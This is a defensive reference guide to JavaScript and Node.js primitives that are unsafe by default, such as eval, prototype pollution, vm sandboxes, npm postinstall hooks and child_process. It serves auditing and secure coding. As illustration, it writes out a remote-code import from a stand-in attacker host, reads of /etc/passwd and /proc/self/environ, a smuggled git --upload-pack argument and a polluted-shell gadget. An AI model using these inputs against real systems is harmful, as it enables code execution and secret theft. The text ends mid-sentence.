# JavaScript and Node.js Behavioral Footguns — Language Primitives That Are Unsafe by Default
## Synthesized from V8 / Node.js core engineers, Node.js Ecosystem Security Working Group members, npm-supply-chain researchers, and the academic + industry advisories that catalog JS/Node-specific failure modes

> **Currency marker:** Last refreshed 2026-05-14. This document is part of
> the language-specific-behavioral-footguns class — companion to
> `csharp_dotnet_footguns_expertise.md` and `java_footguns_expertise.md` —
> that catalogs primitives whose *default behavior* in a particular
> language ecosystem is unsafe, distinct from cross-language bug-class
> docs. The 2026 wave of npm-supply-chain compromises (Axios
> postinstall RAT March 2026; the resurrected vm2 line of CVEs January
> and May 2026), the 2025-2026 churn around server-side prototype
> pollution after Shcherbakov et al.'s "Silent Spring" CodeQL gadget
> mining, and the Bun-and-Deno runtime fragmentation are the load-bearing
> 2024-2026 updates.
>
> **Researchers:**
> - **Mathias Bynens** (@mathias) — Developer advocate, V8 / Chrome team,
>   Google; author of "JavaScript engine fundamentals: optimizing
>   prototypes" (2018), the canonical V8-internals reference for shapes,
>   hidden classes, inline caches, and prototype-chain optimization;
>   co-editor of TC39 proposals; primary source for "why `Object.create(null)`
>   is the right defense" framing
> - **Liran Tal** (@lirantal) — Developer Relations, Snyk; OpenJS
>   Foundation Pathfinder for Security awardee; author of *Essential
>   Node.js Security* and the *Node.js Secure Coding* series (command
>   injection, path traversal, code injection); member of the Node.js
>   Ecosystem Security Working Group; canonical npm supply-chain
>   reference
> - **Bryan English** (@bengl) — Node.js Core Collaborator; member of
>   the Node.js Ecosystem Security Working Group; reference for built-in-vs-third-party security boundary questions
> - **Patrik Simek** (@patriksimek) — Original author of `vm2`; the
>   single most cited cautionary tale in the JS-sandbox literature;
>   his July 2023 discontinuation announcement on `vm2` ("We now
>   find ourselves facing an escape so complicated that fixing it
>   seems impossible") is the canonical end-state for in-process JS
>   sandboxes; his October 2025 revival of vm2 (3.10.0) continued to
>   ship CVEs
> - **Olivier Arteau** (@HoLyVieR) — Researcher, NorthSec 2018; author
>   of "Prototype Pollution Attack in NodeJS Application" — the
>   canonical disclosure paper that introduced the bug class, with
>   exploit primitives in `merge`, `clone`, `extend`, recursive
>   assignment, and JSON `__proto__` injection
> - **Mikhail Shcherbakov** — PhD researcher, KTH Royal Institute of
>   Technology, Stockholm; first author on "Silent Spring: Prototype
>   Pollution Leads to Remote Code Execution in Node.js" (USENIX
>   Security 2023) with Musard Balliu (KTH) and Cristian-Alexandru
>   Staicu (CISPA); built the `silent-spring` CodeQL gadget-mining
>   tooling that confirmed server-side prototype pollution → RCE on
>   real Node.js corpora
> - **Ryan Dahl** (@ry) — Creator of Node.js (2009) and Deno (2018);
>   the "10 Things I Regret About Node.js" JSConf EU 2018 talk that
>   names the security regrets Deno's permission model addresses
> - **Kurt Boberg** — Staff security researcher, Semgrep; reporter of
>   `node-fetch` CVE-2022-0235 (cross-origin Authorization/Cookie
>   forwarding on redirect); reporter of vm2 CVE-2026-22709 (sandbox
>   escape in the resurrected vm2 line); long-running corpus
>   benchmarking of Node.js code-injection workflows on real
>   commercial repos
>
> **Institutional contributors:** Node.js Ecosystem Security Working
> Group (HackerOne-fronted triage for third-party modules); OpenJS
> Foundation Security AMA series; Snyk Vulnerability DB; GitHub
> Security Lab / GitHub Advisory Database; npm Inc. security team;
> PortSwigger Research
> (server-side prototype pollution detection without DoS); MITRE CWE
> (CWE-1321 prototype pollution, CWE-94, CWE-78, CWE-22, CWE-79);
> Microsoft Threat Intelligence + Google Threat Intelligence (separate
> Axios npm compromise analyses, 2026).
>
> **What this doc is NOT:** not a JavaScript language tutorial, not a
> replacement for cross-language bug-class guidance, not a substitute
> for static analysis. It is the JS/Node-specific layer beneath
> cross-language audit heuristics. The deep treatments of prototype
> pollution, JS sandbox escapes, shell injection, SSRF URL parsing,
> template-code injection, XML parser differentials, CI/CD supply
> chain, and race conditions live in their own files; this doc names
> the primitive and refers out.

Cross-links: see `prototype_pollution_expertise.md` for the full
prototype-pollution taxonomy and gadget catalog;
`js_sandbox_escape_expertise.md` for the full vm/vm2/isolated-vm/QuickJS
treatment; `shell_injection_expertise.md` for cross-language
shell-injection patterns; `ssrf_url_parsing_expertise.md` for URL
parser differentials and the `node-fetch` redirect class;
`template_code_injection_expertise.md` for SSTI / Handlebars / Pug;
`cicd_supply_chain_expertise.md` for npm + `postinstall` + lockfile
pinning; `xml_parser_differential_expertise.md` for the mXSS /
mutation-on-reparse surface; `race_conditions_concurrency_expertise.md`
for async / Promise / event-loop hazards; `code_review_expertise.md`
for the click-count severity heuristic; `semgrep_rule_authoring.md`
for detection-rule authoring guidance.

---

## 1. The behavioral-footgun framing

### 1.1 Why JavaScript is a footgun-dense language

The compiler-will-let-you axiom (per `csharp_dotnet_footguns_expertise.md`
§1.2) bites hardest in JavaScript because JavaScript has no compiler in
the dynamic-error-checking sense. The runtime accepts almost any
syntactically valid program and surfaces failures as type-coerced
results: a string where an integer was expected, `undefined` flowing
through arithmetic to produce `NaN`, `null` matching `0` under `==`, a
property access on a non-object silently returning `undefined`. Every
one of those is a footgun in the sense this doc uses — legitimate
language, ordinary code, executed without complaint, with a
security-relevant outcome the developer did not intend.

### 1.2 Node = JavaScript + everything

The Node.js standard library adds filesystem (`fs`), process management
(`child_process`), HTTP server and client (`http` / `https` / `fetch`),
arbitrary code evaluation (`vm`), dynamic module loading (`require` /
`import()`), and OS-level primitives (`process.env`, native addons via
N-API).

JavaScript's behavioral footguns compose with Node's primitives.
`eval(USER)` is bad on its own; in Node, `eval` reaches the filesystem,
the network, and `child_process.exec`. The browser at least imposes
same-origin policy and a renderer sandbox; Node deliberately removes
those guardrails because it is a server-side runtime. A bug that would
be DoS in the browser (`JSON.stringify(circular)` throws) is a
`process.exit(1)` cascade in Node. A bug that would be DOM XSS in the
browser (prototype pollution) is RCE in Node when the polluted property
reaches `child_process.exec` (Shcherbakov et al., USENIX 2023).

### 1.3 The audit-cost asymmetry, JS edition

JavaScript's lack of type information means the reviewer cannot rely on
a parameter type to constrain inputs. A method that takes `string` in
C# rejects an array at compile time; the JS equivalent accepts the
array, coerces via `String(value)` → `"a,b,c"`, and may produce a
different SQL fragment or shell argument than the developer expected.

TypeScript narrows the surface but does not close it (§13). `any`,
`as`, and `// @ts-ignore` are escape hatches that satisfy the type
checker without constraining runtime values. Audit posture: trust the
types, verify the boundaries. Every external-data ingress (HTTP body,
query string, env var, file content) is `any` until proven otherwise.

### 1.4 Cross-link discipline

Bug-class docs explain *what the vulnerability is*. This doc explains
*what the JS/Node primitive does, such that the bug class emerges from
ordinary use*. For SSRF, the bug-class doc (`ssrf_url_parsing_expertise.md`)
covers parser differentials, hostname canonicalization, and
IP-allowlist defeats; the JS-specific footgun is "`fetch` follows
redirects by default with `redirect: 'follow'`, and pre-3.1.1
`node-fetch` forwarded `Authorization` to the cross-origin redirect
target."

---

## 2. Type coercion: `==` versus `===`

### 2.1 The Abstract Equality Comparison algorithm

ECMA-262 defines `x == y` as the Abstract Equality Comparison (AEC),
a multi-step algorithm that, before comparing values, coerces operands
of different types to a common type. The cascade includes:

- `null == undefined` returns `true` (special case).
- `Number == String` coerces the string to a number; the AEC then
  recurses on the numeric pair.
- `Boolean == X` coerces the boolean to a number (`true` → 1,
  `false` → 0); the AEC recurses.
- `Object == primitive` calls `ToPrimitive` on the object — which
  invokes `valueOf()` first, then `toString()` — and recurses on the
  coerced result.

The recursion is the source of the famous "WTF" examples:

```js
[] == ![]        // true
[] == false      // true
'' == false      // true
'0' == false     // true
0 == false       // true
null == 0        // false  (only `null == undefined` is true; null is not coerced)
null == undefined // true
'1' == 1          // true
'01' == 1         // true
' ' == 0          // true   (whitespace coerces to 0)
```

`[] == ![]` is the canonical "this language is broken" example. The
right-hand `![]` is `false` (objects are truthy; `!truthy` is `false`).
The left-hand `[]` is an object. `Object == Boolean` is the
right-hand-boolean-to-number case: the AEC coerces `false` → 0, then
recurses on `[] == 0`. `Object == Number` calls `ToPrimitive([])` —
`[].toString()` is `""`, the empty string — and recurses on `'' == 0`.
`String == Number` coerces `'' → 0`. Now `0 == 0`. `true`.

### 2.2 Security-relevant `==` patterns

Call sites where `==` is reachable from user input:

- **Auth bypass via type confusion.** `if (req.body.role == 1)`
  accepts `"1"` (string→number), `true` (bool→1), `[1]` (array
  stringifies to `"1"` then coerces). Intent was strict integer
  check; implementation accepts heterogeneous types.
- **NoSQL operator injection.** `{"password": {"$ne": null}}` passed
  to a MongoDB query builder bypasses `==` checks (object stringifies
  to `"[object Object]"`) while the `$ne` operator matches every
  record. See `code_review_expertise.md` §6 for the bug class.
- **Numeric drift.** `'0.1' + '0.2' == 0.3` is `false` (string
  concatenation produces `'0.10.2'`, coerces to `NaN`).

### 2.3 The Strict Equality Comparison

`===` skips the AEC. Different types return `false`; same types
compare directly with the exceptions `NaN === NaN` is `false` (use
`Number.isNaN`) and `+0 === -0` is `true`. Defensive rule from every
JS style guide since Crockford (2008): always `===`. ESLint `eqeqeq`
enforces it.

### 2.4 `Array.prototype.sort` default

`[10, 1, 2].sort()` returns `[1, 10, 2]`. The default comparator
converts each element to a string and sorts lexicographically; `'10'`
sorts before `'2'` because `'1'` < `'2'` in code-point order.

The footgun pattern: numeric sorting that "works" because the test
data happens to be single-digit, then breaks at scale. In
security-relevant code, this surfaces in pagination, rate-limit
windows, and ordering of audit-log entries.

The fix: pass a comparator. `arr.sort((a, b) => a - b)` for ascending
numeric sort.

### 2.5 `parseInt` implicit-radix legacy

`parseInt('08')` returns 8 in modern engines; in older runtimes the
leading zero was octal and parsing stopped at `8`. Defense: always
`parseInt(str, 10)`. Related: `parseInt('0x10')` returns 16 (auto-hex
detection); user input through `parseInt` without a radix can produce
16× the expected magnitude.

### 2.6 `typeof null === 'object'`

A 1995 Netscape tag-bit encoding choice. Null-checks written as
`if (typeof obj === 'object') { obj.prop }` fail (and throw) on
`null`. Defense: `if (obj !== null && typeof obj === 'object')`.

### 2.7 `JSON.parse('null')` vs `JSON.parse('"null"')`

The first returns `null`; the second returns the string `"null"`.
Type-discipline code that does `if (JSON.parse(input) === null)`
misses the string case.

---

## 3. The `eval` family: `eval`, `Function`, stringy timers, `with`

### 3.1 `eval(USER)` is direct RCE in Node, direct XSS in the browser

`eval` evaluates a string as JavaScript in the calling lexical scope
(direct eval) or in the global scope (indirect eval — `(0, eval)(str)`,
`globalThis.eval(str)`). In the browser this is XSS; in Node it is
RCE (filesystem, `child_process`, network).

Strict-mode direct eval gives `let`/`const` declarations inside the
eval'd string a fresh declarative environment, narrowing scope
pollution; existing variables remain readable and writable. ESLint
`no-eval` is the standard. V8's
`--disallow-code-generation-from-strings` (or
`vm.runInNewContext` with `codeGeneration: { strings: false }`)
disables eval in opt-in contexts. CSP `'unsafe-eval'` blocks it in
the browser.

### 3.2 `new Function('return ' + USER)` — the second eval class

The `Function` constructor's body string is compiled with global
scope. Common in template engines (Pug, EJS, Handlebars compiled
mode) and memoization patterns. Any user-controlled segment of the
body is RCE. Same V8 flags and CSP directives gate it as eval.

### 3.3 `setTimeout(USER_STRING, ms)` — the third eval class

`setTimeout(callback, ms)` accepts a function or a string; the string
form is evaluated in global scope. `setInterval(string, ms)` is the
repeating analog. Rare in modern code (ESLint `no-implied-eval`
flags it) but appears in obfuscated supply-chain attacks that
compose the string from fragments to evade substring matchers.

### 3.4 `with` statement (strict-mode forbidden)

`with (obj) { stmt }` puts `obj` at the head of the scope chain for
`stmt`; identifier resolution depends on `obj`'s current property
shape. `with` is forbidden in strict mode (ES5+) but appears in
legacy code and in some template engines that use it to make
template variables look local. Security footgun: a template like
`with (data) { return ${expr}; }` resolves `expr` against attacker-
controlled keys including global identifier overrides (`Math`,
`String`). Defense: `"use strict"` everywhere — enforced at parse.

### 3.5 `eval` in strict vs non-strict mode

Strict mode narrows eval: declarations inside the eval'd string get
a fresh declarative environment instead of leaking into the caller.
The eval'd code still reads and writes the caller's existing
variables. Module code is automatically strict; top-level CJS is
not. Mixed mode is the hazard.

---

## 4. Prototype manipulation and prototype pollution

Cross-link: full taxonomy and gadget catalog in
`prototype_pollution_expertise.md`. This section gives the JS-specific
behavioral framing.

### 4.1 The prototype chain in 30 seconds

Every JS object has a `[[Prototype]]` slot. Property lookup walks
the chain until `Object.prototype` (whose prototype is `null`).
Writes to `obj.__proto__.X = Y` do not set a property on `obj`;
they reach through the accessor and set `X = Y` on every object that
inherits from `Object.prototype`. That is the entire prototype-
pollution attack surface in one sentence.

### 4.2 The polluting primitives

Arteau's four canonical primitives (NorthSec 2018):

1. **Recursive merge** — `merge(target, source)` patterns that
   recurse without filtering `__proto__`/`constructor`.
   `lodash.merge` pre-4.17.5 was the canonical sink.
2. **Recursive clone/extend** — same shape, source from input.
3. **Path-based assignment** — `_.set(obj, 'a.b.c', v)` with
   user-controlled path; `'__proto__.X'` reaches the prototype.
4. **`JSON.parse` of `__proto__` keys** — produces an object with
   a non-inherited own property `__proto__`; merged downstream via
   any of primitives 1-3, pollutes.

### 4.3 Server-side prototype pollution → RCE

Shcherbakov et al.'s "Silent Spring" (USENIX Security 2023) confirmed
prototype pollution reaches RCE via gadget chains. The paper's
CodeQL-based framework mines Node.js code for polluted-then-read
patterns; its exploited RCEs were in NPM CLI, Parse Server, and
Rocket.Chat. Gadget taxonomy:
`child_process.spawn` options consuming `env` / `shell`;
`require` consuming `main` / `NODE_OPTIONS`.

The gadget pattern: a downstream API reads `obj.opt` where `opt` is
optional and the caller did not provide it. The runtime walks the
prototype chain; if `Object.prototype.opt` was polluted upstream, the
read returns the polluted value. For `spawn(cmd, args, opts)`,
`opts.shell` is optional and defaults to `false`. A polluted
`Object.prototype.shell = '/bin/sh -c'` turns every spawn call into
a shell invocation, converting argv injection into command injection.

### 4.4 Defenses

- `Object.create(null)` for every map-like object. No prototype, no
  pollution reach.
- `Object.freeze(Object.prototype)` at process start (after built-in
  setup). Writes throw in strict mode, no-op in sloppy; pollution
  is blocked either way.
- `Object.hasOwn(obj, key)` (ES2022) instead of `key in obj` —
  `hasOwn` does not walk the prototype chain.
- Allowlist filtering of `__proto__` / `constructor` / `prototype`
  keys at the input-validation layer (`express-mongo-sanitize`-style).
- ESLint core rule `no-prototype-builtins`, `eslint-plugin-security`.

### 4.5 The `__proto__` vs `constructor.prototype` bypass

`obj.constructor.prototype.X = Y` is functionally equivalent to
`obj.__proto__.X = Y`. Filters that block only `__proto__` are
bypassed via the constructor path. PortSwigger's 2023 black-box
server-side detection research routinely uses this when `__proto__`
is filtered.

---

## 5. `this` binding chaos

### 5.1 The four ways `this` is bound

JavaScript's `this` is dynamic, late-bound, and dependent on call
site. The four mechanisms:

1. **Method call.** `obj.method()` binds `this` to `obj`.
2. **Function call.** `fn()` binds `this` to `undefined` in strict
   mode, or to the global object (`window` in browsers,
   `globalThis` in modules, `global` in CJS Node) in sloppy mode.
3. **Constructor call.** `new Fn()` binds `this` to a freshly
   allocated object with `Fn.prototype` as its `[[Prototype]]`.
4. **Explicit binding.** `.call(thisArg, ...args)`,
   `.apply(thisArg, args)`, or `.bind(thisArg)` set `this`
   explicitly. `.bind` returns a new function with `this`
   permanently fixed.

### 5.2 Arrow functions: lexical `this`

Arrow functions (`(args) => body`) do not have their own `this`. They
inherit `this` lexically from the enclosing function scope. This is
useful — it eliminates the `var self = this` workaround pattern from
ES5 — but it is *not* the same binding as a regular function.

The footgun: a regular function passed where an arrow function was
expected (or vice versa) silently swaps `this`. In React class
components, `<button onClick={this.handleClick}>` (without `.bind` or
arrow function) is the canonical bug; the button calls `handleClick`
as a free function, `this` is `undefined` in strict mode, and the
handler throws on first access.

### 5.3 The "lost `this`" pattern

`setTimeout(obj.method, 1000)` extracts `obj.method` as a free
function reference, then invokes it after the delay. The invocation
site is `setTimeout`'s internal scheduler, not `obj`, so `this` is
not `obj`.

The same pattern recurs in:
- Event handlers: `element.addEventListener('click', obj.method)`.
- Promise then-chains: `promise.then(obj.method)`.
- Array methods: `arr.forEach(obj.method)` (note: `forEach` accepts
  an explicit `thisArg` as a second argument, but the more common
  shape forgets it).
- Node `EventEmitter`: `emitter.on('event', obj.method)`.

The defensive forms: `setTimeout(() => obj.method(), 1000)` (arrow
function captures `obj`); `setTimeout(obj.method.bind(obj), 1000)`
(explicit bind); declaring `method` as a class field with arrow
syntax (`method = () => {...}`) so it's always bound.

### 5.4 Security relevance of `this` binding

Usually correctness bugs, but two security-relevant patterns:

- A module export that relies on `this`, invoked as a free function
  in sloppy mode, reads/writes `globalThis` — silently mutating
  session data, config, or auth tokens parked there.
- A class method passed as an Express route handler
  (`app.get('/route', controller.method)`) loses `this`, throws
  TypeError, and the global error handler may emit a stack trace
  with request-bound secrets.

### 5.5 Strict vs sloppy `this`

Strict mode: function called without a receiver gets `this ===
undefined` (errors immediately). Sloppy: `this === globalThis`
(silent global mutation). Modules are strict; top-level CJS is not.

---

## 6. Node `vm` module and the sandbox illusion

Cross-link: full treatment in `js_sandbox_escape_expertise.md`. This
section names the primitive.

### 6.1 `vm.runInContext` is not a security feature

The Node.js `vm` module documentation includes the explicit warning:

> The `vm` module is not a security mechanism. Do not use it to run
> untrusted code.

The mechanism: `vm.createContext(sandbox)` returns a context object
that wraps a fresh V8 Context (a separate set of built-in globals).
`vm.runInContext(code, context)` evaluates `code` against that
context's globals. The sandbox can have its `Object`, `Function`,
`Array`, etc., replaced or shimmed.

The footgun: the sandbox is *not* isolated at the V8 process boundary.
Code in the sandbox can reach the host's `Object.prototype` via any
object passed in, can grab a reference to the host's `Function`
constructor via `this.constructor.constructor` from a sandboxed
function, and from there call `new Function('return process')()` to
get the host's process object.

### 6.2 vm2: deprecated, then resurrected, still unsafe

`vm2` (Patrik Simek, 2014-2023) was the canonical attempt to wrap
the `vm` module with proxy-based interception to prevent the host-
prototype escape. It was used by hundreds of npm packages, including
template engines, online judges, no-code platforms, and serverless
function runners.

Patrik Simek deprecated `vm2` in 2023 with the explicit statement
that it could not be made secure; Simek resurrected the project in
October 2025 (3.10.0). The 2026 wave of vm2 CVEs (the January
2026 sandbox-escape line, and the May 2026 critical-severity
disclosures with CVSS up to 10.0) confirmed Simek's original
position: in-process JS isolation against an attacker who controls
the source code is structurally infeasible.

Kurt Boberg's CVE-2026-22709 is one of the January 2026 disclosures
against the resurrected vm2 line.

### 6.3 The defensive alternatives

The treatments in `js_sandbox_escape_expertise.md` cover:

- **`isolated-vm`** (Marcel Laverdet): V8 Isolate boundaries, the
  closest thing to a real sandbox in-process, but with significant
  caveats (V8 OOM is unrecoverable; `isolated-vm` is in maintenance
  mode).
- **QuickJS via `quickjs-emscripten`**: a separate JS engine compiled
  to WASM, with the WASM boundary as the trust boundary. Slower than
  V8 but the trust boundary is well-defined.
- **Worker threads + structured-clone passing**: same V8 process,
  separate Isolate, no shared memory (other than `SharedArrayBuffer`
  if explicitly created), but the host still controls module loading
  and process-level resources.
- **Subprocess**: spawn a separate `node` process, communicate via
  IPC, kill on misbehavior. The strongest practical sandbox; OS
  process boundaries are the trust boundary.

The first-order rule: if you
want to run untrusted JavaScript, you want a process boundary, not a
language-level construct.

---

## 7. JSON, async, and Promise pitfalls

### 7.1 `JSON.parse` on user input

`JSON.parse(USER)` is safe by itself — it does not evaluate
JavaScript. The footguns are downstream: prototype pollution via
`__proto__` key (§4.2 primitive 4); DoS via deeply nested arrays
(`JSON.parse('[' + '[1]'.repeat(N) + ']')` succeeds but allocates O(N)
nested objects); silent information loss when numeric fields like
`1e1000` round to `Infinity`. Defense: validate parsed shape with
`ajv` or `zod`.

### 7.2 `JSON.stringify(circular)` throws

`JSON.stringify` throws `TypeError` on circular references. An
attacker who can introduce a circular reference into an object the
server later stringifies (for logging, response serialization, or
template interpolation) achieves DoS. The pollution-enabled variant:
a polluted `Object.prototype.X` that contains a back-reference makes
every subsequent stringify call throw. Defense: pass a `replacer`
or use a safe stringify library (`json-stringify-safe`, `flatted`) —
noting that `flatted.parse` is itself a prototype-pollution sink
(CVE-2026-33228).

### 7.3 Unhandled Promise rejection: Node 15+ exits by default

Pre-Node-15, an unhandled Promise rejection emitted a deprecation
warning but did not terminate the process. From Node 15.0.0 onward,
the default is `--unhandled-rejections=throw`: with no
`unhandledRejection` hook, an unhandled rejection is raised as an
uncaught exception and crashes the process.

The footgun: an attacker who can cause an async path to reject without
a handler can crash a Node.js server. Common shapes:

- `async` route handler that throws on bad input, and the framework
  does not `.catch()` it. Express pre-5 had this shape; Express 5 (in
  RC for years; released 2024) automatically forwards async-handler
  rejections to the error middleware.
- `Promise.all([p1, p2])` where `p1` rejects but `p2` is also
  rejected later; the second rejection is unhandled.
- Background tasks: `setInterval(() => somePromise.then(...))`
  without a `.catch` on the inner promise.

The defensive form: every Promise-producing path has a `.catch` or
is `await`ed inside a `try`. The `process.on('unhandledRejection',
handler)` global hook is a safety net, not a substitute.

### 7.4 `Promise.all([])` short-circuits on first reject

`Promise.all` resolves to an array of values if every input promise
resolves, and rejects with the *first* rejection if any input rejects.
A rejection short-circuits the aggregate: subsequent rejections in
other inputs are silently dropped (and become unhandled rejections,
unless the inputs also have local `.catch` handlers).

The audit pattern: `Promise.all([uploadA(), uploadB(), uploadC()])`
where one upload may reject early. If the others are still in-flight
and later reject, those rejections are unhandled — DoS in Node 15+.

The defensive form: `Promise.allSettled([...])` returns an array of
`{status: 'fulfilled' | 'rejected', value | reason}` objects, never
itself rejects, and lets the caller decide per-input what to do.

### 7.5 Async generators and `for await` resource cleanup

`for await (const x of gen()) { ... }` iterates an async generator,
awaiting each yielded promise. If the loop breaks or throws, the
generator's `return()` or `throw()` method is called to allow
cleanup. The footgun: cleanup is *not guaranteed* if the iteration
is abandoned without a `break`/`return`/`throw`, or if the consuming
code does not use `for await` (e.g., manual `.next()` calls).

Open file descriptors, database cursors, and HTTP streams are the
canonical resources. A leaked async generator's `return()` not called
leaks the resource until the generator object is garbage-collected,
which may be hours or never.

### 7.6 `await` inside `forEach` does not await

`arr.forEach(async (x) => await doWork(x))` is the canonical bug.
`forEach` ignores callback return values; the async callbacks return
promises that are immediately discarded. The outer code proceeds as
if all work completed, but the work is still in flight.

Correct shapes: `for (const x of arr) { await doWork(x); }`
(sequential); `await Promise.all(arr.map(x => doWork(x)))` (parallel).
Audit pattern: grep for `forEach.*async`.

### 7.7 Event-loop starvation

A recursive `process.nextTick(cb)` chain runs callbacks before any
I/O, starving the event loop and producing "Maximum call stack size
exceeded" or unbounded stalls. Attacker-induced event-loop stalls are
a DoS class for Node.js servers, particularly behind single-instance
load balancers.

---

## 8. `require` / `import` and module resolution

### 8.1 `require(USER)` — module path injection

CommonJS `require(path)` accepts a string path and:

1. If the path starts with `./` or `../` or `/`, resolves to a file
   on disk relative to the calling module.
2. If the path starts with a node-builtin name (`fs`, `path`,
   `child_process`, etc.), loads the builtin.
3. Otherwise, walks `node_modules` directories from the calling
   module up the directory tree, looking for a matching package.

Path 3 has audit implications even *without* `USER`-controlled input:
the resolution walk reaches arbitrary `node_modules` directories,
which an attacker who controls disk content (a writable temp dir, a
shared filesystem, a typo-squatted package) can populate.

`require(USER)` is the direct form: the attacker controls the path
string. Reachable sinks include:

- Built-in modules: `require('child_process').exec(USER_CMD)` —
  RCE.
- Filesystem-relative modules: `require('../../etc/passwd')` — read
  arbitrary content as a JS module (parses fail loudly, but
  `require('/proc/self/environ')` is a real-world read primitive).
- Package modules: `require('lodash')` — the attacker can plant a
  malicious `lodash` inside the resolution path.

### 8.2 `require.resolve` with user input

`require.resolve(path)` returns the resolved filesystem path without
executing the module. Audit-relevant because it leaks the resolution
algorithm's *answer* — useful for path-traversal reconnaissance
("does this server have `/proc/self/cwd/node_modules/admin-tools`?")
and for the second-stage attack where the resolved path is then
written by a different bug.

### 8.3 Dynamic `import(USER)` (ESM) — same surface

ES Modules use dynamic `import(path)` for runtime loading. The
resolution algorithm differs from CJS (`import` is async, supports
URLs, and may have different `node_modules` semantics) but the
attack surface is equivalent: `import(USER)` is module path injection.

A subtle difference: `import()` can take a URL string. In Node 16+,
`import('data:text/javascript,console.log(1)')` evaluates inline
JavaScript from a data URL. `import('http://attacker.example/x.mjs')`
fetched and evaluated remote JavaScript only behind the
`--experimental-network-imports` flag, which was removed in Node
22.6.0. The attacker who reaches an `import()`
call with a controlled URL string achieves RCE without touching
the filesystem.

### 8.4 npm install and `postinstall` scripts

The npm install hook chain — `preinstall`, `install`, `postinstall` —
runs scripts declared in `package.json` `"scripts"` automatically.
`postinstall` runs after the package and dependencies are installed
and is the most-exploited hook because the install appears successful.

The full taxonomy of supply-chain attacks lives in
`cicd_supply_chain_expertise.md` §5. The JS-specific behavioral
points:

- **Default-execute, default-trust.** `npm install` runs every
  dependency's `postinstall` script with the full privileges of the
  user. Lockfile pinning (`package-lock.json`, `pnpm-lock.yaml`,
  `yarn.lock`) pins versions but does not gate script execution.
- **Phantom dependencies.** The March 2026 Axios compromise (analyzed
  by Microsoft Threat Intelligence and Google Threat Intelligence)
  introduced a transitive dependency (`plain-crypto-js@4.2.1`) whose
  sole purpose was the `postinstall` hook. The hook delivered a RAT
  across Windows, macOS, and Linux. The package then erased its own
  files to evade post-install audit.
- **Mitigations.**
  - `npm config set ignore-scripts true` (or `--ignore-scripts` flag)
    disables every install hook. Breaks legitimate native-addon
    builds; require a separate, audited build step.
  - Cooldown / age-gating: see `~/Library/Application
    Support/ClaudeCode/CLAUDE.md` org policy — `npm
    min-release-age=7` (7-day cooldown after publish), `pnpm
    minimumReleaseAge: 10080` (minutes), `yarn npmMinimalAgeGate: 10080` (minutes).
    Malicious versions are typically caught and yanked within 24
    hours; a 7-day cooldown blocks all but the slowest-detected
    campaigns.
  - Vendoring + SBOM auditing: pin every dependency including
    transitive ones; review the SBOM on every dependency upgrade;
    fail CI on unexpected new direct dependencies.

### 8.5 `node_modules` hoisting + flat resolution

npm flattens dependency trees; pnpm uses a content-addressed virtual
store. Either way, a `require('foo')` from inside `node_modules/bar`
may resolve to a `foo` that `bar` did not declare. Audit implications:
package `dependencies` is an incomplete map of what the package
actually uses; version conflicts may silently produce two `foo`
modules in the same process; pnpm's strict-mode store prevents the
hoisting surprises and is recommended for security-relevant projects.

### 8.6 ESM/CJS interop pitfalls

Default-export shape mismatch (`export default X` in ESM vs
`module.exports = X` in CJS) can silently produce `undefined` field
accesses across the interop boundary. Top-level `await` works in ESM,
not CJS. `__dirname`/`__filename` exist in CJS, not in ESM (use
`import.meta.url`). The hazard: boundary crossings change parsed
shapes without changing source identifiers; a security-relevant field
(auth token, key path) may be silently `undefined` after crossing.

---

## 9. `child_process` and `fs` defaults

Cross-link: `shell_injection_expertise.md` for the cross-language
shell-injection treatment.

### 9.1 `child_process.exec(USER)` — shell injection by default

`child_process.exec(command, options, callback)` *always* runs the
`command` string through a shell (`/bin/sh -c` on POSIX, `cmd.exe /d
/s /c` on Windows). User-controlled segments of `command` are
shell-metachar-interpreted, including `;`, `|`, `&&`, `||`, backticks,
`$()`, `<`, `>`, and (on Windows) `^`, `&`, and `%VAR%` expansion.

`exec(USER)` is shell injection without qualification. The defensive
alternatives:

- `child_process.execFile(file, args, options, callback)` — runs
  `file` directly via `execve(2)` without a shell. The `args` array
  is passed as `argv`; no shell parsing.
- `child_process.spawn(file, args, options)` — same shape as
  `execFile`, returns a stream-based handle instead of a buffered
  callback.

### 9.2 `child_process.spawn(USER, args)` — argv injection

Even `spawn` without `shell: true` has a residual surface. If `USER`
is the program path and the attacker controls it, `spawn(USER, [])`
runs an arbitrary program — process control, not shell injection.

The more subtle bug: `spawn('git', ['log', USER_BRANCH])` where
`USER_BRANCH` is something like `--upload-pack=touch /tmp/pwn`. The
shell is not invoked; `git` itself parses `--upload-pack` as an
argument, and the canonical CVE-2017-1000117 (git `ssh://` clone)
turned argv injection into RCE.

Argv injection is the cross-language bug class
(`shell_injection_expertise.md` §2). The JS-specific behavioral note:
Node's `spawn` only rejects NUL bytes in `file` and `args`; leading
dashes and embedded newlines pass through to `execve`.

### 9.3 `spawn` with `shell: true`

The `options.shell` flag re-introduces the `exec`-class footgun.
`spawn(cmd, args, {shell: true})` joins `cmd` and `args` into a
single command string with naive quoting, then runs that string
through the shell. The naive quoting is incomplete; embedded
single-quotes and backslashes can break out.

The Shcherbakov RCE gadget chain reaches `spawn` with `{shell: '/bin/sh
-c'}` via prototype pollution: the polluted `Object.prototype.shell`
appears as `options.shell` in any `spawn` call where the caller did
not explicitly pass `shell: false`. This is the canonical "polluted
default" → RCE pattern.

### 9.4 `fs.readFile(USER_PATH)` — path traversal

`fs.readFile(path)` accepts any string and reads the contents — no
validation, no jail. Defensive forms: `path.resolve(USER_PATH)` then
check `resolved.startsWith(jailDir + path.sep)`; `fs.realpath` after
open to resolve symlinks and re-check the jail; Node 20+ experimental
`--permission` + `--allow-fs-read=/safe/dir` for runtime enforcement.

### 9.5 `fs.createReadStream(USER_PATH)`

Same traversal surface plus unbounded-stream DoS: a 1 GB file piped
over HTTP without per-byte validation saturates egress. Defensive:
`highWaterMark` backpressure plus a byte counter that cuts after a
configured cap.

### 9.6 Symlink following

`fs.readFile`, `fs.open`, `fs.createReadStream`, `fs.readdir` follow
symlinks by default. Defensive: `O_NOFOLLOW` open flag, or
`fs.realpath` pre-check. Symlink-race TOCTOU is the bug class (see
`race_conditions_concurrency_expertise.md`); Node's `fs` does not
protect against it by default.

### 9.7 `process.env` exposes secrets

`process.env` contains every inherited environment variable.
`JSON.stringify(process.env)` for logs, error reporters that
auto-attach environment to issue reports, and unauth-gated health-check
endpoints all serialize every secret the process inherited
(`DATABASE_URL`, API keys, signing secrets). Treat `process.env` as
PII-equivalent: explicit allowlist before serialization.

### 9.8 `process.exit` and pending callbacks

`process.exit(code)` terminates immediately, abandoning pending I/O
including audit-log flush, transaction commit, key-rotation
